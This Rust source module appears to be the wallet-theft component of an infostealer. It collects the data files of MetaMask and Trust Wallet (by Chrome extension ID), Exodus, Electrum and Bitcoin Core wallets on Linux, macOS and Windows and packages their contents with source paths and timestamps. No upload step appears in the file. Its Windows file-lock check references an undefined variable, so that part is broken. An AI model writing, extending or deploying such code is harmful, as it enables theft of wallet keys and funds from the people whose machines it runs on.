use std::collections::BTreeMap;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};

use super::errors::ExtractionError;
use super::types::{DataType, ExtractedData, ExtractionResult, ExtractionTarget};

/// Extracts cryptocurrency wallet data
pub struct WalletExtractor {
    include_locked: bool,
}

impl WalletExtractor {
    pub fn new(include_locked: bool) -> Self {
        Self { include_locked }
    }
    
    /// Extract all configured wallets
    pub fn extract_all(&self) -> Vec<ExtractionResult> {
        let mut results = Vec::new();
        
        results.push(self.extract_metamask());
        results.push(self.extract_exodus());
        results.push(self.extract_electrum());
        results.push(self.extract_bitcoin_core());
        results.push(self.extract_trust_wallet());
        
        results
    }
    
    /// Extract MetaMask extension data
    pub fn extract_metamask(&self) -> ExtractionResult {
        let targets = Self::metamask_paths();
        self.extract_wallet_files(ExtractionTarget::MetaMask, &targets, "ldb")
    }
    
    /// Extract Exodus wallet data
    pub fn extract_exodus(&self) -> ExtractionResult {
        let targets = Self::exodus_paths();
        self.extract_wallet_files(ExtractionTarget::Exodus, &targets, "exodus")
    }
    
    /// Extract Electrum wallet data
    pub fn extract_electrum(&self) -> ExtractionResult {
        let targets = Self::electrum_paths();
        self.extract_wallet_files(ExtractionTarget::Electrum, &targets, "")
    }
    
    /// Extract Bitcoin Core wallet.dat
    pub fn extract_bitcoin_core(&self) -> ExtractionResult {
        let targets = Self::bitcoin_core_paths();
        self.extract_wallet_files(ExtractionTarget::BitcoinCore, &targets, "dat")
    }
    
    /// Extract Trust Wallet extension data
    pub fn extract_trust_wallet(&self) -> ExtractionResult {
        let targets = Self::trust_wallet_paths();
        self.extract_wallet_files(ExtractionTarget::TrustWallet, &targets, "ldb")
    }
    
    fn extract_wallet_files(
        &self,
        target: ExtractionTarget,
        paths: &[PathBuf],
        extension: &str,
    ) -> ExtractionResult {
        let mut data = Vec::new();
        
        for path in paths {
            if !path.exists() {
                continue;
            }
            
            // Check if file is locked
            if !self.include_locked && self.is_file_locked(path) {
                continue;
            }
            
            let result = if path.is_dir() {
                self.extract_directory(target, path, extension)
            } else {
                // For single files, wrap in Vec
                match self.extract_file(target, path) {
                    Ok(file) => Ok(vec![file]),
                    Err(e) => Err(e),
                }
            };
            
            match result {
                Ok(mut files) => data.append(&mut files),
                Err(e) => {
                    return ExtractionResult::failure(
                        target,
                        format!("Failed to extract {}: {}", path.display(), e),
                    );
                }
            }
        }
        
        if data.is_empty() {
            return ExtractionResult::failure(
                target,
                "No wallet files found".to_string(),
            );
        }
        
        ExtractionResult::success(target, data)
    }
    
    fn extract_directory(
        &self,
        target: ExtractionTarget,
        dir: &Path,
        extension: &str,
    ) -> Result<Vec<ExtractedData>, ExtractionError> {
        let mut files = Vec::new();
        
        if !dir.is_dir() {
            return Ok(files);
        }
        
        for entry in fs::read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();
            
            if path.is_file() {
                let file_ext = path.extension()
                    .map(|s| s.to_string_lossy())
                    .unwrap_or_default();
                
                // Match by extension or extract all if no extension filter
                if extension.is_empty() || file_ext == extension {
                    if !self.include_locked && self.is_file_locked(&path) {
                        continue;
                    }
                    
                    files.push(self.extract_file(target, &path)?);
                }
            }
        }
        
        Ok(files)
    }
    
    fn extract_file(
        &self,
        target: ExtractionTarget,
        path: &Path,
    ) -> Result<ExtractedData, ExtractionError> {
        let content = fs::read(path)?;
        let file_name = path.file_name()
            .map(|s| s.to_string_lossy().to_string())
            .unwrap_or_else(|| "unknown".to_string());
        
        let mut metadata = BTreeMap::new();
        metadata.insert("wallet".to_string(), target.as_str().to_string());
        metadata.insert("source_path".to_string(), path.display().to_string());
        metadata.insert("extracted_at".to_string(), get_timestamp());
        
        let data_type = if file_name.ends_with(".json") {
            DataType::Json
        } else if file_name.ends_with(".ldb") || file_name.ends_with(".log") {
            DataType::Database
        } else {
            DataType::Binary
        };
        
        Ok(ExtractedData {
            target,
            name: format!("{}_{}", target.as_str(), file_name),
            data_type,
            content,
            metadata,
        })
    }
    
    fn is_file_locked(&self, _path: &Path) -> bool {
        // Try to open file with write access
        // If it fails, the file might be locked
        #[cfg(windows)]
        {
            use std::fs::OpenOptions;
            OpenOptions::new()
                .write(true)
                .open(path)
                .is_err()
        }
        
        #[cfg(not(windows))]
        {
            // On Unix, check if file is in use by trying to get a lock
            false
        }
    }
    
    // Platform-specific path helpers
    
    fn metamask_paths() -> Vec<PathBuf> {
        let mut paths = Vec::new();
        
        // Chrome extension ID: nkbihfbeogaeaoehlefnkodbefgpgmnn
        if let Some(home) = env::var_os("HOME") {
            // Linux
            paths.push(PathBuf::from(&home).join(
                ".config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgmnn"
            ));
            
            // macOS
            paths.push(PathBuf::from(&home).join(
                "Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgmnn"
            ));
        }
        
        if let Some(appdata) = env::var_os("APPDATA") {
            // Windows
            paths.push(PathBuf::from(&appdata).join(
                "Google/Chrome/User Data/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgmnn"
            ));
        }
        
        paths
    }
    
    fn exodus_paths() -> Vec<PathBuf> {
        let mut paths = Vec::new();
        
        if let Some(home) = env::var_os("HOME") {
            // Linux
            paths.push(PathBuf::from(&home).join(".config/Exodus/exodus.wallet"));
            
            // macOS
            paths.push(PathBuf::from(&home).join(
                "Library/Application Support/Exodus/exodus.wallet"
            ));
        }
        
        if let Some(appdata) = env::var_os("APPDATA") {
            // Windows
            paths.push(PathBuf::from(&appdata).join("Exodus/exodus.wallet"));
        }
        
        paths
    }
    
    fn electrum_paths() -> Vec<PathBuf> {
        let mut paths = Vec::new();
        
        if let Some(home) = env::var_os("HOME") {
            // Linux & macOS
            paths.push(PathBuf::from(&home).join(".electrum/wallets"));
        }
        
        if let Some(appdata) = env::var_os("APPDATA") {
            // Windows
            paths.push(PathBuf::from(&appdata).join("Electrum/wallets"));
        }
        
        paths
    }
    
    fn bitcoin_core_paths() -> Vec<PathBuf> {
        let mut paths = Vec::new();
        
        if let Some(home) = env::var_os("HOME") {
            // Linux
            paths.push(PathBuf::from(&home).join(".bitcoin/wallet.dat"));
            
            // macOS
            paths.push(PathBuf::from(&home).join(
                "Library/Application Support/Bitcoin/wallet.dat"
            ));
        }
        
        if let Some(appdata) = env::var_os("APPDATA") {
            // Windows
            paths.push(PathBuf::from(&appdata).join("Bitcoin/wallet.dat"));
        }
        
        paths
    }
    
    fn trust_wallet_paths() -> Vec<PathBuf> {
        let mut paths = Vec::new();
        
        // Trust Wallet extension ID: egjidjbpglichdcondbcbdnbddppkfpb
        if let Some(home) = env::var_os("HOME") {
            // Linux
            paths.push(PathBuf::from(&home).join(
                ".config/google-chrome/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbddppkfpb"
            ));
            
            // macOS
            paths.push(PathBuf::from(&home).join(
                "Library/Application Support/Google/Chrome/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbddppkfpb"
            ));
        }
        
        if let Some(appdata) = env::var_os("APPDATA") {
            // Windows
            paths.push(PathBuf::from(&appdata).join(
                "Google/Chrome/User Data/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbddppkfpb"
            ));
        }
        
        paths
    }
}

fn get_timestamp() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs().to_string())
        .unwrap_or_else(|_| "0".to_string())
}
